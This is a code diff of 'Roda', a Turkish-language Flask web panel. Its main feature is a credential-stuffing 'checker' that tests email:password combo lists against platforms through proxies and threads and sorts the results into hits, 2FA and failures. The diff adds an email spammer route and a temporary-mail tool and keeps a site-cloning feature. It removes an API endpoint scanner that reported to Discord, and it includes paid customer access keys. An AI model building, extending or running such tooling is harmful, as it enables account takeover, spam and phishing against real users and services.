-    content += "=" * 60 + "\n\n"
-    for cat in categories:
-        eps = [ep for ep in filtered if ep['category'] == cat]
-        if eps:
-            content += f"[ {cat.upper()} ] ({len(eps)} endpoint)\n"
-            content += "-" * 40 + "\n"
-            for ep in eps:
-                content += f"[{ep['method']}] {ep['url']}  →  HTTP {ep['status']}\n"
-            content += "\n"
-    content += "=" * 60 + "\n"
-    content += f"Toplam: {len(filtered)} endpoint\n"
-    content += f"Tarih: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
-    files = {'file': ('roda_api_scan.txt', content)}
     try:
-        r = requests.post(url, data={'content': '🔱 **Roda API Taraması Tamamlandı!**'}, files=files, timeout=10)
-        add_log(f"Webhook gönderildi: {len(filtered)} endpoint", "SUCCESS")
+        r = requests.post(url, json={"content": content}, timeout=10)
         return jsonify({"success": r.status_code in [200, 204]})
     except:
         return jsonify({"success": False}), 500
 
-@app.route("/api/fetch_proxies", methods=["GET"])
+@app.route("/api/fetch_proxies")
 def fetch_proxies_route():
     try:
         proxies = fetch_proxies()
@@ -951,9 +528,6 @@ def fetch_proxies_route():
     except Exception as e:
         return jsonify({"success": False, "error": str(e)})
 
-# ============================================================
-# SİTE KOPYALA (ADMIN)
-# ============================================================
 @app.route("/api/sitecopy", methods=["POST"])
 def sitecopy():
     key = request.args.get("key")
@@ -963,32 +537,57 @@ def sitecopy():
     url = data.get("url", "").strip()
     if not url:
         return jsonify({"error": "URL gerekli"}), 400
-    if not url.startswith(('http://', 'https://')):
-        url = 'https://' + url
     try:
-        headers = {
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'
-        }
-        resp = requests.get(url, headers=headers, timeout=15)
-        resp.raise_for_status()
-        soup = BeautifulSoup(resp.text, 'html.parser')
-        base_tag = soup.new_tag('base', href=url)
-        if soup.head:
-            soup.head.insert(0, base_tag)
-        else:
-            new_head = soup.new_tag('head')
-            new_head.append(base_tag)
-            soup.html.insert(0, new_head)
-        html_content = soup.prettify()
+        html = copy_site(url)
         add_log(f"Site kopyalandı: {url}", "SUCCESS")
-        return Response(html_content, mimetype='text/html', headers={'Content-Disposition': f'attachment; filename="kopyalanan_site.html"'})
+        return Response(html, mimetype='text/html', headers={'Content-Disposition': 'attachment; filename="kopyalanan_site.html"'})
     except Exception as e:
         add_log(f"Site kopyalama hatası: {url} - {str(e)}", "ERROR")
         return jsonify({"error": str(e)}), 500
 
+@app.route("/api/temp_mail_generate", methods=["POST"])
+def temp_mail_generate():
+    key = request.args.get("key")
+    if not is_admin(key):
+        return jsonify({"error": "Yetkisiz"}), 401
+    return jsonify(generate_temp_mail())
+
+@app.route("/api/temp_mail_refresh", methods=["POST"])
+def temp_mail_refresh():
+    key = request.args.get("key")
+    if not is_admin(key):
+        return jsonify({"error": "Yetkisiz"}), 401
+    data = request.json
+    token = data.get("token", "")
+    if not token:
+        return jsonify({"error": "Token gerekli"}), 400
+    return jsonify(get_temp_mail_messages(token))
+
+@app.route("/api/temp_mail_read", methods=["POST"])
+def temp_mail_read():
+    key = request.args.get("key")
+    if not is_admin(key):
+        return jsonify({"error": "Yetkisiz"}), 401
+    data = request.json
+    token = data.get("token", "")
+    msg_id = data.get("msg_id", "")
+    if not token or not msg_id:
+        return jsonify({"error": "Token ve msg_id gerekli"}), 400
+    return jsonify(read_temp_mail(token, msg_id))
+
+@app.route("/api/spam_send", methods=["POST"])
+def spam_send():
+    key = request.args.get("key")
+    if not is_admin(key):
+        return jsonify({"error": "Yetkisiz"}), 401
+    data = request.json
+    email = data.get("email", "").strip()
+    if not email:
+        return jsonify({"error": "Email gerekli"}), 400
+    return jsonify(send_spam(email))
+
 # ============================================================
-# HTML (MAVİ TEMA + KAR TANELERİ + TÜM ÖZELLİKLER)
+# HTML (KAR TANELİ + MENÜ)
 # ============================================================
 HTML_TEMPLATE = r"""
 <!DOCTYPE html>
@@ -996,13 +595,14 @@ HTML_TEMPLATE = r"""
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1.0">
-<title>Roda - Tüm Checker'lar</title>
+<title>Roda - Checker</title>
 <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 <style>
 *{margin:0;padding:0;box-sizing:border-box;font-family:Outfit,sans-serif}
 body{background:#0a0e1a;color:#e8edf5;height:100vh;overflow:hidden;display:flex}
 :root{--p:#3b82f6;--p2:#6366f1;--g:#10b981;--r:#ef4444;--card:#0f172a;--border:rgba(59,130,246,0.2);--bg:#0a0e1a;--sidebar:#020617;--text:#e8edf5;--muted:#94a3b8;--gold:#fbbf24}
+/* KAR TANELERİ */
 .snowflakes{position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:0;overflow:hidden}
 .snowflake{position:absolute;color:#fff;font-size:1.5em;top:-10%;animation:fall linear infinite;opacity:0.7}
 @keyframes fall{0%{transform:translateY(0) rotate(0deg) scale(0.5);opacity:0.8}100%{transform:translateY(110vh) rotate(720deg) scale(1.2);opacity:0.2}}
@@ -1048,51 +648,6 @@ body{background:#0a0e1a;color:#e8edf5;height:100vh;overflow:hidden;display:flex}
 .card{background:var(--card);border:1px solid var(--border);border-radius:14px;padding:14px 16px;margin-bottom:12px}
 .card h3{font-size:14px;font-weight:700;margin-bottom:8px;color:var(--text)}
 .card h3 i{color:var(--p);margin-right:6px}
-.stats-row{display:grid;grid-template-columns:repeat(5,1fr);gap:10px;margin-bottom:12px}
-.stat-card{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:12px;text-align:center}
-.stat-card .stat-val{font-size:22px;font-weight:800}
-.stat-card .stat-lbl{font-size:10px;color:var(--muted);text-transform:uppercase;letter-spacing:0.5px}
-.stat-hit .stat-val{color:var(--g)}.stat-2fa .stat-val{color:var(--gold)}.stat-bad .stat-val{color:var(--r)}.stat-total .stat-val{color:var(--p)}.stat-error .stat-val{color:#f59e0b}
-.result-header{display:grid;grid-template-columns:60px 70px 1fr 110px;gap:8px;padding:6px 12px;font-size:10px;font-weight:700;color:var(--muted);text-transform:uppercase;border-bottom:1px solid var(--border)}
-.result-row{display:grid;grid-template-columns:60px 70px 1fr 110px;gap:8px;padding:6px 12px;border-bottom:1px solid rgba(255,255,255,0.03);font-size:12px;align-items:center}
-.result-row:hover{background:rgba(59,130,246,0.03)}
-.hit{color:var(--g)}.bad{color:var(--r)}.twofa{color:var(--gold)}.error{color:#f59e0b}
-.method{font-weight:600;padding:1px 6px;border-radius:4px;font-size:9px;display:inline-block}
-.method.get{background:rgba(16,185,129,0.12);color:var(--g)}
-.method.post{background:rgba(59,130,246,0.12);color:#448aff}
-.method.other{background:rgba(245,158,11,0.12);color:#f59e0b}
-.category{padding:1px 8px;border-radius:12px;font-size:9px;font-weight:500;display:inline-block}
-.cat-auth{background:rgba(239,68,68,0.12);color:#ef4444}
-.cat-admin{background:rgba(245,158,11,0.12);color:#f59e0b}
-.cat-user{background:rgba(16,185,129,0.12);color:var(--g)}
-.cat-health{background:rgba(59,130,246,0.12);color:#448aff}
-.cat-api{background:rgba(59,130,246,0.12);color:var(--p)}
-.cat-genel{background:rgba(255,255,255,0.04);color:#94a3b8}
-.scan-top{display:flex;gap:10px;flex-wrap:wrap;align-items:center}
-.scan-top input{flex:1;min-width:150px;padding:8px 14px;background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:10px;color:#fff;font-size:13px;outline:none}
-.scan-top input:focus{border-color:var(--p)}
-.scan-top button{padding:8px 20px;background:linear-gradient(135deg,var(--p),var(--p2));color:#fff;border:none;border-radius:10px;font-weight:700;cursor:pointer;display:flex;align-items:center;gap:6px;font-size:13px}
-.scan-top button:disabled{opacity:0.5;cursor:not-allowed}
-.filters{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:8px}
-.filters label{display:flex;align-items:center;gap:4px;font-size:11px;color:#94a3b8;cursor:pointer}
-.filters input[type=checkbox]{accent-color:var(--p);width:13px;height:13px}
-.results-container{flex:1;overflow-y:auto;border-radius:12px;background:rgba(0,0,0,0.25);border:1px solid var(--border)}
-.webhook-area{margin-top:10px;display:flex;gap:10px;flex-wrap:wrap;align-items:center}
-.webhook-area input{flex:1;min-width:150px;padding:6px 12px;background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:10px;color:#fff;font-size:12px;outline:none}
-.webhook-area input:focus{border-color:var(--p)}
-.webhook-area button{padding:6px 16px;background:linear-gradient(135deg,var(--p),var(--p2));color:#fff;border:none;border-radius:10px;font-weight:600;cursor:pointer;font-size:12px}
-.setting-row{display:flex;align-items:center;justify-content:space-between;padding:8px 0;border-bottom:1px solid var(--border)}
-.setting-row label{font-size:13px;font-weight:500}
-.setting-row .desc{font-size:10px;color:var(--muted)}
-.switch{position:relative;width:40px;height:22px}
-.switch input{display:none}
-.slider{position:absolute;top:0;left:0;right:0;bottom:0;background:var(--border);border-radius:22px;cursor:pointer;transition:0.3s}
-.slider:before{content:"";position:absolute;height:16px;width:16px;left:3px;bottom:3px;background:#fff;border-radius:50%;transition:0.3s}
-input:checked+.slider{background:var(--g)}
-input:checked+.slider:before{transform:translateX(18px)}
-.proxy-area{display:flex;gap:10px;flex-wrap:wrap;margin-top:6px}
-.proxy-area textarea{flex:1;min-width:180px;height:50px;padding:6px 10px;background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:8px;color:#fff;font-size:11px;outline:none;resize:vertical;font-family:monospace}
-.proxy-area textarea:focus{border-color:var(--p)}
 .checker-platform-select{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:12px}
 .checker-platform-select button{padding:6px 14px;background:rgba(59,130,246,0.08);border:1px solid rgba(59,130,246,0.15);border-radius:8px;color:#94a3b8;font-size:12px;cursor:pointer;transition:0.2s;display:flex;align-items:center;gap:4px}
 .checker-platform-select button:hover{background:rgba(59,130,246,0.15);border-color:var(--p);color:#fff}
@@ -1107,16 +662,13 @@ input:checked+.slider:before{transform:translateX(18px)}
 .checker-top button{padding:6px 18px;background:linear-gradient(135deg,var(--p),var(--p2));color:#fff;border:none;border-radius:8px;font-weight:600;cursor:pointer;font-size:13px}
 .checker-top button:disabled{opacity:0.5}
 .checker-top button#checkerStopBtn{background:var(--r);display:none}
-.checker-filters{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:8px}
-.checker-filters label{display:flex;align-items:center;gap:4px;font-size:11px;color:#94a3b8;cursor:pointer}
-.checker-filters input[type=radio]{accent-color:var(--p);width:13px;height:13px}
+.checker-stats{display:flex;gap:16px;flex-wrap:wrap;margin:6px 0;font-size:12px}
+.checker-stats span{color:var(--muted)}
+.checker-stats .chk-count{font-weight:700;color:var(--text)}
 .checker-results{max-height:250px;overflow-y:auto;border-radius:8px;background:rgba(0,0,0,0.2);border:1px solid var(--border)}
 .checker-result-row{display:grid;grid-template-columns:1fr 100px 60px;gap:8px;padding:6px 12px;border-bottom:1px solid rgba(255,255,255,0.03);font-size:12px;align-items:center}
 .checker-result-row .chk-status{font-weight:600}
 .chk-hit{color:var(--g)}.chk-bad{color:var(--r)}.chk-2fa{color:var(--gold)}.chk-error{color:#f59e0b}
-.checker-stats{display:flex;gap:16px;flex-wrap:wrap;margin:6px 0;font-size:12px}
-.checker-stats span{color:var(--muted)}
-.checker-stats .chk-count{font-weight:700;color:var(--text)}
 .hit-panel{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:12px}
 .hit-panel .hit-box{background:var(--card);border:1px solid var(--border);border-radius:12px;padding:12px}
 .hit-panel .hit-box h4{font-size:13px;font-weight:700;margin-bottom:6px;display:flex;align-items:center;gap:6px}
@@ -1128,35 +680,33 @@ input:checked+.slider:before{transform:translateX(18px)}
 .hit-filter{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:6px}
 .hit-filter select{padding:4px 10px;background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:6px;color:#fff;font-size:12px;outline:none}
 .hit-filter select:focus{border-color:var(--p)}
-.parse-area{display:flex;flex-direction:column;gap:10px}
-.parse-area textarea{width:100%;height:180px;padding:10px;background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:8px;color:#fff;font-size:12px;font-family:monospace;resize:vertical;outline:none}
-.parse-area textarea:focus{border-color:var(--p)}
-.parse-buttons{display:flex;gap:10px;flex-wrap:wrap}
-.parse-result{max-height:200px;overflow-y:auto;background:rgba(0,0,0,0.2);border:1px solid var(--border);border-radius:8px;padding:8px}
-.parse-result .parse-line{padding:2px 6px;font-size:12px;font-family:monospace;color:#c8d0dc}
-.parse-result .parse-count{color:var(--g);font-weight:600;font-size:13px}
-.discovery-platforms{display:flex;gap:6px;flex-wrap:wrap;margin-bottom:8px}
-.discovery-platforms button{padding:4px 12px;background:rgba(59,130,246,0.06);border:1px solid rgba(59,130,246,0.1);border-radius:6px;color:#94a3b8;font-size:11px;cursor:pointer;transition:0.2s}
-.discovery-platforms button:hover{background:rgba(59,130,246,0.12);border-color:var(--p);color:#fff}
-.discovery-platforms button.active{background:rgba(59,130,246,0.15);border-color:var(--p);color:var(--p)}
+.proxy-area{display:flex;gap:10px;flex-wrap:wrap;margin-top:6px}
+.proxy-area textarea{flex:1;min-width:180px;height:50px;padding:6px 10px;background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:8px;color:#fff;font-size:11px;outline:none;resize:vertical;font-family:monospace}
+.proxy-area textarea:focus{border-color:var(--p)}
+.setting-row{display:flex;align-items:center;justify-content:space-between;padding:8px 0;border-bottom:1px solid var(--border)}
+.setting-row label{font-size:13px;font-weight:500}
+.setting-row .desc{font-size:10px;color:var(--muted)}
+.switch{position:relative;width:40px;height:22px}
+.switch input{display:none}
+.slider{position:absolute;top:0;left:0;right:0;bottom:0;background:var(--border);border-radius:22px;cursor:pointer;transition:0.3s}
+.slider:before{content:"";position:absolute;height:16px;width:16px;left:3px;bottom:3px;background:#fff;border-radius:50%;transition:0.3s}
+input:checked+.slider{background:var(--g)}
+input:checked+.slider:before{transform:translateX(18px)}
 ::-webkit-scrollbar{width:4px}::-webkit-scrollbar-thumb{background:rgba(59,130,246,0.2);border-radius:4px}
 </style>
 </head>
 <body>
-<!-- KAR TANELERİ -->
 <div class="snowflakes" id="snowContainer"></div>
-
 <div id="login-screen">
 <div id="login-box">
 <div class="logo"><i class="fa-solid fa-crown"></i></div>
 <h1>RODA</h1>
-<p class="sub">Tüm Checker'lar Tek Yerde</p>
+<p class="sub">Checker</p>
 <input class="inp" type="password" id="authKey" placeholder="Güvenlik Anahtarı" autofocus>
 <button class="btn" onclick="doLogin()" style="margin-top:12px">Giriş Yap</button>
 <p id="loginError" style="color:var(--r);margin-top:12px;display:none"></p>
 </div>
 </div>
-
 <div id="sidebar">
 <div class="sidebar-header"><div class="logo-text">RODA</div><div class="version">v3.0</div></div>
 <div class="sidebar-nav">
@@ -1164,23 +714,21 @@ input:checked+.slider:before{transform:translateX(18px)}
 <div class="nav-item active" data-page="checker" onclick="switchPage('checker')"><i class="fa-solid fa-check-double"></i> Checker</div>
 <div class="nav-item" data-page="proxy" onclick="switchPage('proxy')"><i class="fa-solid fa-server"></i> Proxy</div>
 <div class="nav-item" data-page="parse" onclick="switchPage('parse')"><i class="fa-solid fa-scissors"></i> Ayrıştırma</div>
-
 <div class="nav-divider-admin">🔒 ADMIN</div>
 <div class="nav-item" data-page="logs" onclick="switchPage('logs')" id="logsMenuItem" style="display:none"><i class="fa-solid fa-history"></i> Loglar</div>
-<div class="nav-item" data-page="discovery" onclick="switchPage('discovery')" id="discoveryMenuItem" style="display:none"><i class="fa-solid fa-compass"></i> API Keşif</div>
-<div class="nav-item" data-page="stats" onclick="switchPage('stats')" id="statsMenuItem" style="display:none"><i class="fa-solid fa-chart-simple"></i> İstatistik</div>
 <div class="nav-item" data-page="keys" onclick="switchPage('keys')" id="keysMenuItem" style="display:none"><i class="fa-solid fa-key"></i> Key Yönetimi</div>
 <div class="nav-item" data-page="sitecopy" onclick="switchPage('sitecopy')" id="sitecopyMenuItem" style="display:none"><i class="fa-solid fa-copy"></i> Site Kopyala</div>
+<div class="nav-item" data-page="tempmail" onclick="switchPage('tempmail')" id="tempmailMenuItem" style="display:none"><i class="fa-solid fa-envelope"></i> Temp Mail</div>
+<div class="nav-item" data-page="spammer" onclick="switchPage('spammer')" id="spammerMenuItem" style="display:none"><i class="fa-solid fa-bomb"></i> Email Spammer</div>
 </div>
 <div class="sidebar-stats">
-<div class="mini-stat mini-hit"><div class="val" id="sideTotal">0</div><div class="lbl">Bulunan</div></div>
-<div class="mini-stat mini-2fa"><div class="val" id="sideAuth">0</div><div class="lbl">Auth</div></div>
-<div class="mini-stat mini-bad"><div class="val" id="sideAPI">0</div><div class="lbl">API</div></div>
-<div class="mini-stat mini-check"><div class="val" id="sideAdmin">0</div><div class="lbl">Admin</div></div>
+<div class="mini-stat mini-hit"><div class="val" id="sideHit">0</div><div class="lbl">Hit</div></div>
+<div class="mini-stat mini-2fa"><div class="val" id="side2fa">0</div><div class="lbl">2FA</div></div>
+<div class="mini-stat mini-bad"><div class="val" id="sideBad">0</div><div class="lbl">Bad</div></div>
+<div class="mini-stat mini-check"><div class="val" id="sideTotal">0</div><div class="lbl">Toplam</div></div>
 </div>
 <div class="sidebar-footer">© 2026 Roda</div>
 </div>
-
 <div id="app">
 <div class="topbar">
 <div class="topbar-title"><i class="fa-solid fa-gauge-high"></i> <span id="pageTitle">Checker</span></div>
@@ -1192,17 +740,16 @@ input:checked+.slider:before{transform:translateX(18px)}
 </div>
 </div>
 <div class="main-content">
-
 <!-- CHECKER -->
 <div id="page-checker" class="page active">
 <div class="card">
 <h3><i class="fa-solid fa-check-double"></i> Platform Checker</h3>
-<p style="font-size:12px;color:var(--muted);margin-bottom:10px">Bir platform seçin, combo girişi yapın ve kontrol başlatın. <span style="color:var(--gold)">✅ HIT'ler otomatik webhook ile gönderilir!</span></p>
+<p style="font-size:12px;color:var(--muted);margin-bottom:10px">Bir platform seçin, combo girişi yapın ve kontrol başlatın.</p>
 <div class="checker-platform-select" id="checkerPlatformSelect"></div>
 <div class="checker-panel" id="checkerPanel">
 <div class="checker-top">
 <textarea id="checkerCombo" placeholder="email:password (her satıra bir combo)"></textarea>
-<input type="number" id="checkerThreads" value="1" min="1" max="50">
+<input type="number" id="checkerThreads" value="1" min="1" max="20">
 <button id="checkerStartBtn" onclick="startChecker()"><i class="fa-solid fa-play"></i> Başlat</button>
 <button id="checkerStopBtn" onclick="stopChecker()"><i class="fa-solid fa-stop"></i> Durdur</button>
 </div>
@@ -1212,14 +759,6 @@ input:checked+.slider:before{transform:translateX(18px)}
 <span>Başarısız: <span class="chk-count" id="chkBad">0</span></span>
 <span>2FA: <span class="chk-count" id="chk2fa">0</span></span>
 <span>Hata: <span class="chk-count" id="chkError">0</span></span>
-<span>Kalan: <span class="chk-count" id="chkRemaining">0</span></span>
-</div>
-<div class="checker-filters">
-<label><input type="radio" name="chkFilter" value="all" checked> Hepsi</label>
-<label><input type="radio" name="chkFilter" value="hit"> Başarılı</label>
-<label><input type="radio" name="chkFilter" value="bad"> Başarısız</label>
-<label><input type="radio" name="chkFilter" value="2fa"> 2FA</label>
-<label><input type="radio" name="chkFilter" value="error"> Hata</label>
 </div>
 <div class="checker-results" id="checkerResults">
 <div style="padding:20px;text-align:center;color:var(--muted);font-size:13px">Henüz sonuç yok.</div>
@@ -1246,15 +785,12 @@ input:checked+.slider:before{transform:translateX(18px)}
 </div>
 </div>
 </div>
-
 <!-- PROXY -->
 <div id="page-proxy" class="page">
 <div class="card">
 <h3><i class="fa-solid fa-server"></i> Proxy Yöneticisi</h3>
-<div style="display:flex;gap:8px;flex-wrap:wrap;margin-bottom:8px">
 <button class="btn sm g" onclick="fetchProxies()"><i class="fa-solid fa-cloud-arrow-down"></i> Proxy Çek</button>
 <button class="btn sm r" onclick="clearProxies()"><i class="fa-solid fa-trash"></i> Temizle</button>
-</div>
 <div class="setting-row">
 <div><label>Proxy Kullan</label><div class="desc">Checker sırasında proxy kullan</div></div>
 <label class="switch"><input type="checkbox" id="useProxy" onchange="toggleProxy()"><span class="slider"></span></label>
@@ -1265,96 +801,24 @@ input:checked+.slider:before{transform:translateX(18px)}
 <div style="margin-top:6px"><span id="proxyCount" style="color:var(--g);font-size:12px">0 proxy yüklendi</span></div>
 </div>
 </div>
-
-<!-- API KEŞİF (ADMIN) -->
-<div id="page-discovery" class="page">
-<div class="card" style="padding:10px 14px">
-<div class="scan-top">
-<input id="targetDomain" placeholder="hedef.com (örn: youtube.com)" value="example.com">
-<button id="scanBtn" onclick="startScan()"><i class="fa-solid fa-play"></i> Tara</button>
-</div>
-<div class="discovery-platforms" id="discoveryPlatforms"></div>
-</div>
-<div class="stats-row">
-<div class="stat-card stat-hit"><div class="stat-val" id="totalCount">0</div><div class="stat-lbl">Toplam</div></div>
-<div class="stat-card stat-2fa"><div class="stat-val" id="authCount">0</div><div class="stat-lbl">Auth</div></div>
-<div class="stat-card stat-bad"><div class="stat-val" id="apiCount">0</div><div class="stat-lbl">API</div></div>
-<div class="stat-card stat-total"><div class="stat-val" id="adminCount">0</div><div class="stat-lbl">Admin</div></div>
-</div>
-<div class="filters" id="filterContainer">
-<label><input type="checkbox" value="Auth" checked> Auth</label>
-<label><input type="checkbox" value="Admin" checked> Admin</label>
-<label><input type="checkbox" value="User" checked> User</label>
-<label><input type="checkbox" value="Health" checked> Health</label>
-<label><input type="checkbox" value="API" checked> API</label>
-<label><input type="checkbox" value="Genel" checked> Genel</label>
-</div>
-<div class="results-container">
-<div class="result-header"><div>Metod</div><div>Durum</div><div>Endpoint</div><div>Kategori</div></div>
-<div id="resultsList"></div>
-</div>
-<div class="webhook-area">
-<input id="webhookUrl" placeholder="Discord Webhook URL">
-<button onclick="saveWebhook()"><i class="fa-solid fa-floppy-disk"></i> Webhook Kaydet</button>
-<button onclick="testWebhook()"><i class="fa-solid fa-paper-plane"></i> Test</button>
-<button onclick="sendWebhook()"><i class="fa-brands fa-discord"></i> Discord</button>
-<button onclick="exportJSON()" class="btn sm b"><i class="fa-solid fa-download"></i> JSON</button>
-<p id="webhookStatus" style="margin-top:6px;font-size:12px;color:var(--muted)"></p>
-</div>
-</div>
-
-<!-- AYRIŞTIRMA (2 MOD) -->
+<!-- AYRIŞTIRMA -->
 <div id="page-parse" class="page">
 <div class="card">
 <h3><i class="fa-solid fa-scissors"></i> Ayrıştırma</h3>
-<p style="font-size:12px;color:var(--muted);margin-bottom:10px">Karmaşık metinleri temizler, 2 mod seçeneği ile ayrıştırır.</p>
+<p style="font-size:12px;color:var(--muted);margin-bottom:10px">2 mod seçeneği ile ayrıştırır.</p>
 <div class="parse-area">
 <label style="font-size:13px;color:var(--muted)">Mod Seç:</label>
 <select id="parseMode" style="padding:8px;background:rgba(0,0,0,0.3);border:1px solid var(--border);border-radius:8px;color:#fff;font-size:12px;outline:none;width:200px">
 <option value="email">Email:Şifre</option>
 <option value="user">Kullanıcı:Şifre</option>
 </select>
-<textarea id="parseInput" placeholder="Buraya karışık metni yapıştır..."></textarea>
-<div class="parse-buttons">
+<textarea id="parseInput" placeholder="Metni yapıştır..."></textarea>
 <button class="btn sm g" onclick="parseData()"><i class="fa-solid fa-wand-magic-sparkles"></i> Ayrıştır</button>
 <button class="btn sm b" onclick="parseToChecker()"><i class="fa-solid fa-arrow-right"></i> Checker'a Aktar</button>
-<button class="btn sm r" onclick="clearParse()"><i class="fa-solid fa-eraser"></i> Temizle</button>
-<button class="btn sm" style="background:#64748b" onclick="loadParseFile()"><i class="fa-solid fa-folder-open"></i> Dosya Yükle</button>
-</div>
-<div class="parse-result" id="parseResult">
-<div style="color:var(--muted);font-size:13px;padding:10px">Henüz ayrıştırma yapılmadı.</div>
-</div>
-<div style="margin-top:6px;font-size:12px;color:var(--muted)">
-<span id="parseCount">0 satır</span> | <span id="parseValid">0 geçerli</span>
+<div class="parse-result" id="parseResult"></div>
 </div>
 </div>
 </div>
-</div>
-
-<!-- İSTATİSTİK (ADMIN) -->
-<div id="page-stats" class="page">
-<h2 style="margin-bottom:14px;font-weight:700;background:linear-gradient(135deg,var(--p),var(--p2));-webkit-background-clip:text;-webkit-text-fill-color:transparent">📊 Tarama İstatistikleri</h2>
-<div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:14px">
-<div style="background:var(--card);border:1px solid var(--border);border-radius:12px;padding:18px"><h3 style="font-size:12px;color:var(--muted)">Toplam Tarama</h3><p style="font-size:22px;font-weight:800;background:linear-gradient(135deg,var(--p),var(--p2));-webkit-background-clip:text;-webkit-text-fill-color:transparent" id="statScans">0</p></div>
-<div style="background:var(--card);border:1px solid var(--border);border-radius:12px;padding:18px"><h3 style="font-size:12px;color:var(--muted)">Son Tarama</h3><p style="font-size:22px;font-weight:800;background:linear-gradient(135deg,var(--p),var(--p2));-webkit-background-clip:text;-webkit-text-fill-color:transparent" id="statLast">-</p></div>
-<div style="background:var(--card);border:1px solid var(--border);border-radius:12px;padding:18px"><h3 style="font-size:12px;color:var(--muted)">Bulunan API</h3><p style="font-size:22px;font-weight:800;background:linear-gradient(135deg,var(--p),var(--p2));-webkit-background-clip:text;-webkit-text-fill-color:transparent" id="statEndpoints">0</p></div>
-</div>
-</div>
-
-<!-- KEY YÖNETİMİ (ADMIN) -->
-<div id="page-keys" class="page">
-<div class="card">
-<h3><i class="fa-solid fa-key"></i> Key Oluştur</h3>
-<p style="font-size:11px;color:var(--muted);margin-bottom:8px">🔒 Her key sadece 1 IP'ye bağlanır ve 1 kez kullanılır.</p>
-<div style="display:flex;gap:10px;flex-wrap:wrap;margin-top:6px">
-<div style="flex:1"><label style="font-size:11px;color:var(--muted)">Not</label><input class="inp" id="genNote" placeholder="Müşteri" style="margin-top:4px;padding:10px"></div>
-<div style="width:130px"><label style="font-size:11px;color:var(--muted)">Süre</label><select class="inp" id="genHours" style="margin-top:4px;padding:10px"><option value="1">1 Saat</option><option value="24" selected>24 Saat</option><option value="168">7 Gün</option><option value="720">30 Gün</option></select></div>
-<button class="btn sm g" onclick="generateKey()" style="margin-top:22px"><i class="fa-solid fa-plus"></i> Oluştur</button>
-</div>
-</div>
-<div class="card"><h3><i class="fa-solid fa-list"></i> Aktif Anahtarlar</h3><div id="keyList"><p style="color:var(--muted);font-size:12px">Yükleniyor...</p></div></div>
-</div>
-
 <!-- LOGLAR (ADMIN) -->
 <div id="page-logs" class="page">
 <div class="card">
@@ -1363,798 +827,408 @@ input:checked+.slider:before{transform:translateX(18px)}
 <div id="logsContainer" style="max-height:400px;overflow-y:auto;background:rgba(0,0,0,0.2);border-radius:8px;padding:10px;font-family:monospace;font-size:12px;"></div>
 </div>
 </div>
-
+<!-- KEY YÖNETİMİ (ADMIN) -->
+<div id="page-keys" class="page">
+<div class="card">
+<h3><i class="fa-solid fa-key"></i> Key Yönetimi</h3>
+<p style="font-size:11px;color:var(--muted);margin-bottom:8px">🔒 Admin ve Müşteri key oluşturabilirsiniz.</p>
+<div style="display:flex;gap:10px;flex-wrap:wrap;margin-top:6px">
+<div style="flex:1"><label style="font-size:11px;color:var(--muted)">Not</label><input class="inp" id="genNote" placeholder="Müşteri" style="margin-top:4px;padding:10px"></div>
+<div style="width:130px"><label style="font-size:11px;color:var(--muted)">Süre</label><select class="inp" id="genHours" style="margin-top:4px;padding:10px"><option value="1">1 Saat</option><option value="24" selected>24 Saat</option><option value="168">7 Gün</option><option value="720">30 Gün</option></select></div>
+<button class="btn sm g" onclick="generateKey()" style="margin-top:22px"><i class="fa-solid fa-plus"></i> Oluştur</button>
+</div>
+</div>
+<div class="card"><h3><i class="fa-solid fa-list"></i> Aktif Anahtarlar</h3><div id="keyList"><p style="color:var(--muted);font-size:12px">Yükleniyor...</p></div></div>
+</div>
 <!-- SİTE KOPYALA (ADMIN) -->
 <div id="page-sitecopy" class="page">
 <div class="card">
 <h3><i class="fa-solid fa-copy"></i> Site Kopyala</h3>
-<p style="font-size:12px;color:var(--muted);margin-bottom:10px">Bir web sitesinin tam HTML'ini kopyalar.</p>
-<div class="scan-top" style="margin-bottom:12px">
-<input id="siteCopyUrl" placeholder="https://ornek.com veya ornek.com" value="https://www.tabii.com">
-<button onclick="copySite()"><i class="fa-solid fa-download"></i> Kopyala & İndir</button>
-</div>
-<div id="siteCopyResult" style="font-size:13px;color:var(--muted);"></div>
+<input class="inp" id="siteCopyUrl" placeholder="https://ornek.com" style="margin-bottom:10px">
+<button class="btn sm" onclick="copySite()"><i class="fa-solid fa-download"></i> Kopyala & İndir</button>
+<div id="siteCopyResult" style="margin-top:10px;font-size:13px;color:var(--muted)"></div>
 </div>
 </div>
-
+<!-- TEMP MAIL (ADMIN) -->
+<div id="page-tempmail" class="page">
+<div class="card">
+<h3><i class="fa-solid fa-envelope"></i> Geçici E-Posta</h3>
+<div style="display:flex;gap:10px;flex-wrap:wrap;margin-bottom:10px">
+<input class="inp" id="tempMailInput" placeholder="E-posta" readonly style="flex:1;padding:10px">
+<button class="btn sm g" onclick="generateTempMail()"><i class="fa-solid fa-plus"></i> Üret</button>
+<button class="btn sm b" onclick="copyTempMail()"><i class="fa-solid fa-copy"></i> Kopyala</button>
+</div>
+<button class="btn sm" onclick="refreshTempMail()" style="margin-bottom:10px"><i class="fa-solid fa-rotate"></i> Gelen Kutusunu Yenile</button>
